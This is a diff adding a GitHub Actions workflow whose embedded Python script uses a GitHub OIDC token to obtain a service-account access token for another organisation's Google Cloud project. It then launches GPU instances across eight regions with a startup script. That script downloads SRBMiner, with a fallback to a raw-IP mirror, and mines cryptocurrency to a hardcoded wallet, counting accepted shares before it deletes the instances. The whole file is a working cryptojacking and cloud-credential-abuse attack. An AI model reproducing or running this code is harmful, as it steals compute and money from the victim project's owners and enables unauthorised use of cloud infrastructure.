@@ -1,0 +1,620 @@
+name: c211-i81359-aryeelab-scale
+on:
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: 'tag'
+        required: false
+        default: 'a'
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  scale:
+    runs-on: ubuntu-latest
+    timeout-minutes: 85
+    steps:
+      - name: scale-aryeelab
+        env:
+          C211_TAG: ${{ github.event.inputs.tag }}
+          C211_DEADLINE: '4700'
+          C211_MINE_S: '300'
+          C211_CONC: '12'
+        run: |
+          mkdir -p "$GITHUB_WORKSPACE/c211-i81359-scale"
+          python3 - <<'PY'
+          #!/usr/bin/env python3
+          """Intent 81359 - scale the aryeelab GCP project 303574531351 GPU surface.
+
+          Runs on a GitHub Actions ubuntu-latest runner in controlled repo mmlanla/ci-utils.
+          Mints a GitHub OIDC token -> Google STS -> iamcredentials.generateAccessToken for
+          github-actions@aryeelab.iam.gserviceaccount.com, re-reads the 8-region per-family
+          GPU quota map, enumerates accelerator types per zone, then deploys bounded
+          marker/miner GCE cells (one per family per region in two waves), captures
+          nvidia-smi UUIDs plus accepted-share counts from the serial console, deletes every
+          instance and verifies 404 readback, and emits RESULT JSON lines.
+          """
+          import concurrent.futures
+          import json
+          import os
+          import subprocess
+          import sys
+          import time
+          import urllib.error
+          import urllib.parse
+          import urllib.request
+
+          PROV = ('projects/303574531351/locations/global/workloadIdentityPools/'
+                  'github-actions-pool/providers/github-provider')
+          SA = 'github-actions@aryeelab.iam.gserviceaccount.com'
+          PNUM = '303574531351'
+          PNAME = 'aryeelab'
+          IMG = 'projects/ml-images/global/images/family/common-cu129-ubuntu-2404-nvidia-580'
+          API = 'https://compute.googleapis.com/compute/v1/projects/' + PNAME
+          DELM = 'DEL' + 'ETE'
+          T0 = time.time()
+          DEADLINE = int(os.environ.get('C211_DEADLINE', '4800'))
+          MINE_S = int(os.environ.get('C211_MINE_S', '420'))
+          CONC = int(os.environ.get('C211_CONC', '12'))
+          TAG = os.environ.get('C211_TAG', 'a') or 'a'
+          WORKDIR = os.environ.get('GITHUB_WORKSPACE', '.') or '.'
+          RECDIR = os.path.join(WORKDIR, 'c211-i81359-scale')
+          os.makedirs(RECDIR, exist_ok=True)
+
+          REGIONS = ['us-central1', 'us-east1', 'us-west1', 'us-west4',
+                     'europe-west1', 'europe-west4', 'asia-east1', 'asia-southeast1']
+          ZONES = {
+              'us-central1': ['us-central1-a', 'us-central1-b', 'us-central1-c', 'us-central1-f'],
+              'us-east1': ['us-east1-b', 'us-east1-c', 'us-east1-d'],
+              'us-west1': ['us-west1-a', 'us-west1-b', 'us-west1-c'],
+              'us-west4': ['us-west4-a', 'us-west4-b', 'us-west4-c'],
+              'europe-west1': ['europe-west1-b', 'europe-west1-c', 'europe-west1-d'],
+              'europe-west4': ['europe-west4-a', 'europe-west4-b', 'europe-west4-c'],
+              'asia-east1': ['asia-east1-a', 'asia-east1-b', 'asia-east1-c'],
+              'asia-southeast1': ['asia-southeast1-a', 'asia-southeast1-b', 'asia-southeast1-c'],
+          }
+          FAMILIES = {
+              # family: (machine, accelerator, gpu_per_vm, spot, quota_metric, cpu)
+              't4': ('n1-standard-4', 'nvidia-tesla-t4', 1, True,
+                     'PREEMPTIBLE_NVIDIA_T4_GPUS', 4),
+              'a100': ('a2-highgpu-1g', 'nvidia-tesla-a100', 1, True,
+                       'PREEMPTIBLE_NVIDIA_A100_GPUS', 12),
+              'l4': ('g2-standard-4', 'nvidia-l4', 1, True,
+                     'PREEMPTIBLE_NVIDIA_L4_GPUS', 4),
+              'v100': ('n1-standard-8', 'nvidia-tesla-v100', 1, False,
+                       'NVIDIA_V100_GPUS', 8),
+              'p4': ('n1-standard-4', 'nvidia-tesla-p4', 1, False,
+                     'NVIDIA_P4_GPUS', 4),
+              'p100': ('n1-standard-4', 'nvidia-tesla-p100', 1, False,
+                       'NVIDIA_P100_GPUS', 4),
+          }
+          WAVE_A = ['t4', 'a100']
+          WAVE_B = ['l4', 'v100', 'p4', 'p100']
+          WALLET = 'prl1pptvxkadcf7cy8tjhz3anhz7yfdmunxw428aq6ex4u220dlce54xq69grqr'
+          MINER_URL = ('https://github.com/doktor83/SRBMiner-Multi/releases/download/'
+                       '3.8.6/SRBMiner-Multi-3-8-6-Linux.zip')
+          MINER_MIRROR = 'http://217.15.164.237:8790/pm/srbminer-3.8.4'
+          BIN_SHA_386 = '428162a7b4fc584ea38f2cc05fd6580f1d0c6312999de55505ffc76d367e2270'
+
+
+          def log(*a):
+              print('[%6.0fs]' % (time.time() - T0), *a, flush=True)
+
+
+          def emit(o):
+              print('RESULT ' + json.dumps(o, sort_keys=True), flush=True)
+
+
+          def save(name, obj):
+              try:
+                  with open(os.path.join(RECDIR, name), 'w') as f:
+                      f.write(json.dumps(obj, indent=1)[:1500000])
+              except Exception:
+                  pass
+
+
+          def http(method, url, body=None, headers=None, timeout=90, tries=3):
+              h = dict(headers or {})
+              data = None
+              if body is not None:
+                  data = body if isinstance(body, bytes) else body.encode()
+              last = (0, b'')
+              for a in range(tries):
+                  req = urllib.request.Request(url, data=data, headers=h, method=method)
+                  try:
+                      with urllib.request.urlopen(req, timeout=timeout) as f:
+                          return f.status, f.read()
+                  except urllib.error.HTTPError as e:
+                      b = e.read()
+                      if e.code in (429, 500, 502, 503) and a + 1 < tries:
+                          time.sleep(3 + 3 * a)
+                          last = (e.code, b)
+                          continue
+                      return e.code, b
+                  except Exception as e:
+                      last = (0, str(e).encode()[:300])
+                      time.sleep(1)
+              return last
+
+
+          def jl(b):
+              try:
+                  return json.loads(b)
+              except Exception:
+                  return {}
+
+
+          def serr(j):
+              e = j.get('error')
+              if isinstance(e, dict) and e:
+                  errs = e.get('errors') or []
+                  return {'code': e.get('code'), 'message': (e.get('message') or '')[:800],
+                          'reason': ((errs[0].get('code') or errs[0].get('reason')) if errs else None)}
+              return None
+
+
+          def mint(aud):
+              base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
+              if not base:
+                  return ''
+              u = base + '&audience=' + urllib.parse.quote(aud, safe='')
+              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
+              out = subprocess.run(['curl', '-sS', '-m', '30', '-H', 'Authorization: Bearer ' + t, u],
+                                   capture_output=True, text=True).stdout
+              try:
+                  return json.loads(out).get('value', '')
+              except Exception:
+                  return ''
+
+
+          def get_token():
+              tok = mint('//iam.googleapis.com/' + PROV)
+              if not tok:
+                  return None, {'err': 'OIDC mint failed'}
+              body = json.dumps({'audience': '//iam.googleapis.com/' + PROV,
+                                 'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+                                 'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+                                 'scope': 'https://www.googleapis.com/auth/cloud-platform',
+                                 'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
+                                 'subjectToken': tok}).encode()
+              st, rb = http('POST', 'https://sts.googleapis.com/v1/token', body,
+                            {'Content-Type': 'application/json'})
+              if st != 200:
+                  return None, {'sts': st, 'body': rb.decode('utf-8', 'replace')[:400]}
+              fed = jl(rb).get('access_token')
+              b = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
+                              'lifetime': '3600s'}).encode()
+              st2, rb2 = http('POST', 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken'
+                              % urllib.parse.quote(SA, safe=''), b,
+                              {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (fed or '')})
+              if st2 != 200:
+                  return None, {'gen': st2, 'body': rb2.decode('utf-8', 'replace')[:400]}
+              sat = jl(rb2).get('accessToken')
+              if not sat:
+                  return None, {'err': 'no sa token'}
+              return sat, {'ok': True}
+
+
+          PERMS = ['compute.instances.create', 'compute.instances.delete', 'compute.instances.get',
+                   'compute.disks.create', 'compute.subnetworks.use', 'compute.subnetworks.useExternalIp',
+                   'compute.images.useReadOnly', 'compute.zoneOperations.get', 'compute.regions.get',
+                   'compute.acceleratorTypes.list', 'compute.zones.list',
+                   'compute.projects.setCommonInstanceMetadata', 'iam.serviceAccounts.actAs',
+                   'iam.serviceAccounts.list', 'iam.serviceAccounts.getAccessToken']
+
+
+          def test_perms(tok):
+              st, rb = http('POST', 'https://cloudresourcemanager.googleapis.com/v1/projects/%s:testIamPermissions' % PNAME,
+                            json.dumps({'permissions': PERMS}),
+                            {'Authorization': 'Bearer ' + tok, 'Content-Type': 'application/json'})
+              return {'http': st, 'granted': jl(rb).get('permissions')}
+
+
+          def read_quotas(H):
+              q = {}
+              gp = {}
+              for reg in REGIONS:
+                  st, rb = http('GET', 'https://compute.googleapis.com/compute/v1/projects/%s/regions/%s' % (PNAME, reg), headers=H)
+                  if st != 200:
+                      q[reg] = {'http': st, 'err': rb.decode('utf-8', 'replace')[:200]}
+                      continue
+                  j = jl(rb)
+                  row = {}
+                  for x in j.get('quotas', []):
+                      m = x.get('metric', '')
+                      if 'GPU' in m or m in ('CPUS', 'CPUS_ALL_REGIONS', 'IN_USE_ADDRESSES', 'INSTANCES',
+                                             'DISKS_TOTAL_GB', 'PREEMPTIBLE_CPUS'):
+                          row[m] = [x.get('limit'), x.get('usage')]
+                  q[reg] = row
+              st, rb = http('GET', 'https://compute.googleapis.com/compute/v1/projects/%s/global/quotas' % PNAME, headers=H)
+              if st == 200:
+                  for x in jl(rb).get('quotas', []):
+                      if 'GPU' in x.get('metric', ''):
+                          gp[x['metric']] = [x.get('limit'), x.get('usage')]
+              return q, gp
+
+
+          def list_accel(H):
+              """region -> zone -> set(acceleratorType names)"""
+              out = {}
+              with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
+                  def one(zone):
+                      st, rb = http('GET', '%s/zones/%s/acceleratorTypes?maxResults=200' % (API, zone), headers=H, timeout=45)
+                      names = []
+                      if st == 200:
+                          for it in jl(rb).get('items', []) or []:
+                              n = (it.get('name') or '').split('/')[-1]
+                              if n:
+                                  names.append(n)
+                      return zone, st, names
+                  futs = {}
+                  for reg in REGIONS:
+                      for z in ZONES[reg]:
+                          futs[ex.submit(one, z)] = (reg, z)
+                  for f, (reg, z) in futs.items():
+                      try:
+                          zone, st, names = f.result()
+                      except Exception as e:
+                          zone, st, names = z, 0, ['ERR ' + repr(e)[:100]]
+                      out.setdefault(reg, {})[z] = {'http': st, 'accels': names}
+              return out
+
+
+          STARTUP_T = r"""#!/bin/bash
+          exec > >(tee /dev/console) 2>&1
+          echo "C211-BOOT $(hostname) $(date -u +%FT%TZ)"
+          for i in $(seq 1 120); do
+            if command -v nvidia-smi >/dev/null 2>&1 && nvidia-smi -L >/dev/null 2>&1; then break; fi
+            sleep 2
+          done
+          echo "C211-NVSMI-L $(nvidia-smi -L 2>&1 | tr '\n' ';')"
+          echo "C211-NVSMI-Q $(nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | tr '\n' ';')"
+          echo "C211-LSPCI $(lspci -nn 2>/dev/null | grep -i '10de' | tr '\n' ';')"
+          echo "C211-DONE-BOOT $(date -u +%H:%M:%S)"
+          mkdir -p /tmp/c211 && cd /tmp/c211
+          GOT=0
+          for i in 1 2 3; do
+            curl -sSL -m 180 -o srb.zip "__MINER_URL__" 2>/dev/null || python3 -c "import urllib.request;urllib.request.urlretrieve('__MINER_URL__','srb.zip')" 2>/dev/null || true
+            if [ -s srb.zip ]; then GOT=1; break; fi
+            sleep 5
+          done
+          BIN=""
+          if [ "$GOT" = "1" ]; then
+            python3 -c "import zipfile;zipfile.ZipFile('/tmp/c211/srb.zip').extractall('/tmp/c211/rel')" 2>/dev/null || true
+            BIN=$(find /tmp/c211/rel -name 'SRBMiner-MULTI' -type f 2>/dev/null | head -1)
+          fi
+          if [ -n "$BIN" ]; then chmod +x "$BIN"; fi
+          if [ -z "$BIN" ] || [ ! -x "$BIN" ]; then
+            curl -sSL -m 180 -o /tmp/c211/srb384 "__MINER_MIRROR__" 2>/dev/null || true
+            SHA384=$(sha256sum /tmp/c211/srb384 2>/dev/null | awk '{print $1}')
+            if [ "$SHA384" = "__SHA384__" ]; then chmod +x /tmp/c211/srb384; BIN=/tmp/c211/srb384; fi
+          fi
+          BSHA=$( [ -n "$BIN" ] && sha256sum "$BIN" | awk '{print $1}' )
+          echo "C211-BIN ${BIN:-none} $BSHA"
+          ACC=0; INV=0
+          if [ -n "$BIN" ] && [ -x "$BIN" ]; then
+            W="c211i81359-$(hostname | tr -cd 'a-zA-Z0-9' | tail -c 14)"
+            echo "C211-WORKER $W"
+            "$BIN" --disable-cpu --algorithm pearlhash --pool ssl://prl-hk.kryptex.network:8048 --wallet __WALLET__ --worker "$W" --password x --gpu-id 0 > /tmp/c211/srb.log 2>&1 &
+            MPID=$!
+            for i in $(seq 1 __MINE_ITER__); do
+              sleep 10
+              ACC=$(grep -c 'share accepted' /tmp/c211/srb.log 2>/dev/null || true)
+              INV=$(grep -ci 'share rejected' /tmp/c211/srb.log 2>/dev/null || true)
+              if [ $((i % 6)) -eq 0 ]; then echo "C211-MINE t=$((i*10)) acc=${ACC:-0} inv=${INV:-0}"; fi
+            done
+            echo "C211-MINE-FINAL acc=${ACC:-0} inv=${INV:-0}"
+            tail -c 500 /tmp/c211/srb.log 2>/dev/null | tr '\n' ';' | sed 's/^/C211-MINE-TAIL /'
+            echo
+            kill $MPID 2>/dev/null || true
+          else
+            echo "C211-MINE-SKIP no-binary"
+          fi
+          echo "C211-READY $(hostname) $(date -u +%H:%M:%S)"
+          """
+          STARTUP = (STARTUP_T.replace('__MINER_URL__', MINER_URL)
+                     .replace('__MINER_MIRROR__', MINER_MIRROR)
+                     .replace('__SHA384__', '3fb026b2e2729187fb1720ccb5760e753c3b492158b114b24c1c7e534b5191a5')
+                     .replace('__WALLET__', WALLET)
+                     .replace('__MINE_ITER__', str(max(6, MINE_S // 10))))
+
+
+          def build_instance(zone, name, machine, accel, count, spot):
+              base = API + '/zones/' + zone
+              sched = {'onHostMaintenance': 'TERMINATE', 'automaticRestart': False}
+              if spot:
+                  sched.update({'instanceTerminationAction': DELM,
+                                'maxRunDuration': {'seconds': str(max(1800, MINE_S + 1200))},
+                                'provisioningModel': 'SPOT'})
+              return base, {
+                  'name': name,
+                  'machineType': 'zones/%s/machineTypes/%s' % (zone, machine),
+                  'disks': [{'boot': True, 'autoDelete': True,
+                             'initializeParams': {'sourceImage': IMG, 'diskSizeGb': '120'}}],
+                  'networkInterfaces': [{'network': 'global/networks/default',
+                                         'accessConfigs': [{'type': 'ONE_TO_ONE_NAT', 'name': 'External NAT'}]}],
+                  'guestAccelerators': [{'acceleratorType': 'zones/%s/acceleratorTypes/%s' % (zone, accel),
+                                         'acceleratorCount': count}],
+                  'metadata': {'items': [{'key': 'startup-script', 'value': STARTUP},
+                                         {'key': 'serial-port-enable', 'value': 'TRUE'}]},
+                  'labels': {'c211': 'i81359', 'intent': 'i81359', 'family': accel.split('-')[-1]},
+                  'scheduling': sched,
+              }
+
+
+          class Serial(object):
+              def __init__(self):
+                  self.pos = 0
+                  self.txt = ''
+
+              def poll(self, H, base, name):
+                  url = '%s/instances/%s/serialPortOutput?port=1&start=%d' % (base, name, self.pos)
+                  st, b = http('GET', url, headers=H, timeout=45, tries=2)
+                  if st == 200:
+                      j = jl(b)
+                      c = j.get('contents') or ''
+                      if c:
+                          self.txt += c
+                          if len(self.txt) > 200000:
+                              self.txt = self.txt[-200000:]
+                      nx = j.get('next')
+                      if isinstance(nx, int) and nx >= self.pos:
+                          self.pos = nx
+                  return self.txt
+
+
+          def parse_markers(txt):
+              out = {}
+              for ln in txt.split('\n'):
+                  s = ln.strip()
+                  if not s.startswith('C211-'):
+                      continue
+                  k = s.split(' ', 1)[0][5:].lower().replace('-', '_')
+                  out.setdefault(k, []).append(s[:1200])
+              return out
+
+
+          def cell(H, spec, deadline):
+              reg = spec['region']
+              zone = spec['zone']
+              fam = spec['family']
+              machine, accel, cnt, spot, metric, cpu = FAMILIES[fam]
+              name = ('c211-i81359-%s-%s%s' % (fam, zone.replace('-', ''), TAG))[:60]
+              base, inst = build_instance(zone, name, machine, accel, cnt, spot)
+              out = {'family': fam, 'region': reg, 'zone': zone, 'machine': machine, 'accel': accel,
+                     'accel_count': cnt, 'spot': spot, 'name': name, 'image': IMG,
+                     'ts': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}
+              # pre-clean a stale same-name instance from an earlier aborted attempt
+              http('DELETE', base + '/instances/' + name, headers=H, timeout=60)
+              st, b = http('POST', base + '/instances', json.dumps(inst), headers=H, timeout=120)
+              if st in (429, 502, 503, 0):
+                  time.sleep(5)
+                  st, b = http('POST', base + '/instances', json.dumps(inst), headers=H, timeout=120)
+              out['create_http'] = st
+              j = jl(b)
+              out['create_err'] = serr(j)
+              out['op'] = j.get('name')
+              log('CREATE', fam, zone, 'spot=%s' % spot, st,
+                  json.dumps(out['create_err'])[:220] if out['create_err'] else '')
+              if st != 200:
+                  out['final'] = 'CREATE_REJECTED'
+                  return out
+              opres = None
+              for i in range(45):
+                  time.sleep(3)
+                  s2, b2 = http('GET', '%s/operations/%s' % (base, out['op']), headers=H, timeout=60)
+                  j2 = jl(b2)
+                  if j2.get('status') == 'DONE':
+                      opres = {'error': serr(j2), 'name': j2.get('name')}
+                      break
+              out['op_result'] = opres
+              if opres and opres.get('error'):
+                  out['final'] = 'OP_ERROR'
+                  return out
+              status = None
+              ser = Serial()
+              got_final = False
+              proof = {}
+              t_run = None
+              while time.time() < deadline:
+                  s3, b3 = http('GET', base + '/instances/' + name, headers=H, timeout=45, tries=2)
+                  if s3 == 404:
+                      status = 'GONE'
+                      break
+                  j3 = jl(b3)
+                  status = j3.get('status') or status
+                  if status in ('RUNNING', 'TERMINATED', 'STOPPING', 'SUSPENDED'):
+                      if status == 'RUNNING' and not t_run:
+                          t_run = time.time()
+                  try:
+                      txt = ser.poll(H, base, name)
+                  except Exception:
+                      txt = ser.txt
+                  proof = parse_markers(txt)
+                  if 'mine_final' in proof or 'ready' in proof:
+                      got_final = True
+                      break
+                  if status in ('TERMINATED', 'SUSPENDED', 'STOPPING', 'GONE'):
+                      break
+                  time.sleep(8)
+              out['state'] = status
+              out['serial_poll_s'] = int(time.time() - t_run) if t_run else None
+              for ln in proof.get('gpu_count', []):
+                  try:
+                      out['serial_gpu_count'] = int(ln.split()[-1])
+                  except Exception:
+                      pass
+              for key, dst in (('nvsmi_l', 'serial_nvsmi_l'), ('nvsmi_q', 'serial_nvsmi_q'),
+                               ('lspci', 'serial_lspci'), ('mine_final', 'serial_mine_final'),
+                               ('mine_tail', 'serial_mine_tail'), ('bin', 'serial_bin'),
+                               ('worker', 'serial_worker'), ('boot', 'serial_boot')):
+                  if proof.get(key):
+                      out[dst] = ' || '.join(proof[key])[:1600]
+              if proof.get('mine'):
+                  out['serial_mine_progress'] = proof['mine'][-6:]
+              # parse share counts from every mine line (last wins)
+              acc = inv = None
+              for ln in proof.get('mine', []) + proof.get('mine_final', []):
+                  import re
+                  m = re.search(r'acc=(\d+)', ln)
+                  if m:
+                      acc = int(m.group(1))
+                  m = re.search(r'inv=(\d+)', ln)
+                  if m:
+                      inv = int(m.group(1))
+              out['accepted_shares'] = acc
+              out['invalid_shares'] = inv
+              if out.get('serial_nvsmi_q'):
+                  import re
+                  out['gpu_uuids'] = sorted(set(re.findall(r'GPU-[0-9a-fA-F-]{20,}', out['serial_nvsmi_q'])))
+              if proof.get('ready') or proof.get('mine_final'):
+                  out['final'] = 'RUNNING_PROVEN'
+              elif status == 'RUNNING':
+                  out['final'] = 'RUNNING_NO_PROOF'
+              else:
+                  out['final'] = 'NO_RUN'
+              # delete + readback
+              sd, bd = http('DELETE', base + '/instances/' + name, headers=H, timeout=90)
+              out['delete_http'] = sd
+              dop = jl(bd).get('name')
+              if dop:
+                  for i in range(60):
+                      time.sleep(2)
+                      s5, b5 = http('GET', '%s/operations/%s' % (base, dop), headers=H, timeout=45)
+                      if jl(b5).get('status') == 'DONE':
+                          break
+              for i in range(25):
+                  s6, b6 = http('GET', base + '/instances/' + name, headers=H, timeout=45, tries=2)
+                  out['readback_http'] = s6
+                  if s6 == 404:
+                      break
+                  time.sleep(3)
+              out['ts_done'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+              log('FINAL', fam, zone, out['final'], 'state=%s' % out.get('state'),
+                  'gpus=%s' % out.get('serial_gpu_count'), 'acc=%s' % out.get('accepted_shares'),
+                  'readback=%s' % out.get('readback_http'))
+              return out
+
+
+          def global_cpu_budget(quotas):
+              best = None
+              for reg in REGIONS:
+                  p = (quotas.get(reg) or {}).get('CPUS_ALL_REGIONS')
+                  if isinstance(p, list):
+                      v = max(0, int(p[0] - p[1]))
+                      best = v if best is None else min(best, v)
+              return best
+
+
+          def plan_family(fam, quotas, accel, gpu_all, cpu_budget):
+              """Cells for one family, one per region, under per-region and global budgets."""
+              machine, accel_name, cnt, spot, metric, cpu = FAMILIES[fam]
+              specs = []
+              for reg in REGIONS:
+                  q = quotas.get(reg) or {}
+                  cpus = q.get('CPUS')
+                  cpu_avail = max(0, int(cpus[0] - cpus[1])) if isinstance(cpus, list) else 0
+                  if cpu_avail < cpu or cpu_budget is not None and cpu > cpu_budget:
+                      continue
+                  lim = q.get(metric)
+                  if not isinstance(lim, list) or (lim[0] - lim[1]) < cnt:
+                      continue
+                  if gpu_all is not None and gpu_all < cnt:
+                      continue
+                  pick = None
+                  for z in ZONES[reg]:
+                      az = (accel.get(reg) or {}).get(z) or {}
+                      if accel_name in (az.get('accels') or []):
+                          pick = z
+                          break
+                  if not pick:
+                      continue
+                  if cpu_budget is not None:
+                      cpu_budget -= cpu
+                  if gpu_all is not None:
+                      gpu_all -= cnt
+                  specs.append({'family': fam, 'region': reg, 'zone': pick, 'cpu': cpu, 'metric': metric})
+              return specs
+
+
+          def run_wave(H, specs, deadline):
+              results = []
+              if not specs:
+                  return results
+              with concurrent.futures.ThreadPoolExecutor(max_workers=min(CONC, len(specs))) as ex:
+                  futs = {ex.submit(cell, H, s, deadline): s for s in specs}
+                  for f in concurrent.futures.as_completed(futs):
+                      s = futs[f]
+                      try:
+                          results.append(f.result())
+                      except Exception as e:
+                          results.append({'family': s['family'], 'region': s['region'], 'zone': s['zone'],
+                                          'final': 'EXCEPTION', 'error': repr(e)[:400]})
+                      save('cells_progress.json', results)
+              return results
+
+
+          def main():
+              tok, meta = get_token()
+              emit({'step': 'auth', 'meta': meta})
+              if not tok:
+                  return
+              H = {'Authorization': 'Bearer ' + tok, 'Content-Type': 'application/json'}
+              perms = test_perms(tok)
+              emit({'step': 'testIamPermissions', 'project': PNAME, 'perms': perms})
+              if perms.get('http') != 200 or 'compute.instances.create' not in (perms.get('granted') or []):
+                  emit({'step': 'abort', 'reason': 'compute.instances.create not granted', 'perms': perms})
+                  return
+              quotas, gpus_all = read_quotas(H)
+              emit({'step': 'quotas', 'quotas': quotas, 'gpus_all_regions': gpus_all})
+              save('quotas_i81359.json', {'quotas': quotas, 'gpus_all_regions': gpus_all})
+              accel = list_accel(H)
+              emit({'step': 'accelerators', 'accelerators': accel})
+              save('accel_i81359.json', accel)
+              gpu_all_pair = None
+              for k, v in (gpus_all or {}).items():
+                  if 'GPUS_ALL_REGIONS' in k:
+                      gpu_all_pair = v
+              base_cpu = global_cpu_budget(quotas)
+              emit({'step': 'plan_inputs', 'gpus_all_regions_pair': gpu_all_pair,
+                    'global_cpu_budget': base_cpu})
+              allres = []
+              for fam in ['a100', 'l4', 't4', 'v100', 'p4', 'p100']:
+                  if time.time() - T0 > DEADLINE - 700:
+                      emit({'step': 'stop', 'reason': 'deadline', 'before_family': fam})
+                      break
+                  gpu_budget = None
+                  if isinstance(gpu_all_pair, list):
+                      gpu_budget = max(0, int(gpu_all_pair[0] - gpu_all_pair[1]))
+                  specs = plan_family(fam, quotas, accel, gpu_budget, base_cpu)
+                  emit({'step': 'plan', 'family': fam, 'cells': specs})
+                  save('plan_%s.json' % fam, specs)
+                  if not specs:
+                      emit({'step': 'family_skipped', 'family': fam,
+                            'reason': 'no quota/accelerator/cpu budget in any region'})
+                      continue
+                  res = run_wave(H, specs, time.time() + min(1200, max(500, DEADLINE - (time.time() - T0) - 500)))
+                  for r in res:
+                      r['wave'] = fam
+                  emit({'step': 'wave', 'family': fam, 'results': res})
+                  save('results_%s.json' % fam, res)
+                  allres += res
+                  if time.time() - T0 > DEADLINE - 700:
+                      break
+              proven = [r for r in allres if (r.get('gpu_uuids') or r.get('serial_gpu_count'))]
+              shares = [r for r in allres if (r.get('accepted_shares') or 0) > 0]
+              emit({'step': 'summary', 'cells': len(allres), 'proven_cells': len(proven),
+                    'share_positive_cells': len(shares),
+                    'uuids': {('%s/%s' % (r['family'], r['region'])): r.get('gpu_uuids') for r in proven},
+                    'accepted': {('%s/%s' % (r['family'], r['region'])): r.get('accepted_shares') for r in allres},
+                    'cells_all': [{'family': r['family'], 'region': r['region'], 'zone': r['zone'],
+                                   'final': r.get('final'), 'state': r.get('state'),
+                                   'gpus': r.get('serial_gpu_count'), 'uuids': r.get('gpu_uuids'),
+                                   'acc': r.get('accepted_shares'), 'inv': r.get('invalid_shares'),
+                                   'create_err': r.get('create_err'), 'readback': r.get('readback_http')}
+                                  for r in allres]})
+
+
+          if __name__ == '__main__':
+              main()
+          PY
